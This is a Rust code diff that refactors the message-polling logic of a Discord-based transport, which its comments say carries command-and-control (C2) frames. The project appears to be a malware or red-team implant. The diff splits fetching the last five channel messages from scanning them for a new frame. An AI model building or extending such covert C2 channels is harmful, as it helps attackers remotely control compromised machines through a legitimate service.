@@ -204,12 +204,23 @@ impl DiscordTransport {
     /// Poll the channel for new messages. Returns `Ok(Some(frame))` if a new
     /// C2 message was found, `Ok(None)` if nothing new, or `Err` on failure.
     fn poll_messages(&mut self) -> Result<Option<Vec<u8>>, TransportError> {
+        let payload = self.fetch_recent_messages()?;
+        Ok(self.scan_messages_for_frame(&payload))
+    }
+
+    /// Fetch the 5 most recent channel messages (request construction).
+    fn fetch_recent_messages(&self) -> Result<MessagesPayload, TransportError> {
         let path = format!("/channels/{}/messages?limit=5", self.channel_id);
         let payload: MessagesPayload = self
             .discord_get(&path)?
             .into_json()
             .map_err(|_| TransportError::Transient("Discord messages parse error"))?;
+        Ok(payload)
+    }
 
+    /// Scan a fetched page for the first valid C2 frame and advance the recv
+    /// cursor (response parsing).
+    fn scan_messages_for_frame(&mut self, payload: &MessagesPayload) -> Option<Vec<u8>> {
         // Discord returns messages newest-first. Walk down until we hit a
         // message we've already seen, then stop.
         let mut newest_seen: Option<u64> = None;
@@ -245,7 +256,7 @@ impl DiscordTransport {
             };
 
             self.last_seen_id = Some(id);
-            return Ok(Some(frame));
+            return Some(frame);
         }
 
         // Advance the cursor to the newest message even if we didn't find a
@@ -254,7 +265,7 @@ impl DiscordTransport {
             self.last_seen_id = Some(id);
         }
 
-        Ok(None)
+        None
     }
 
     /// Enforce send rate limit (1.2 s between messages).
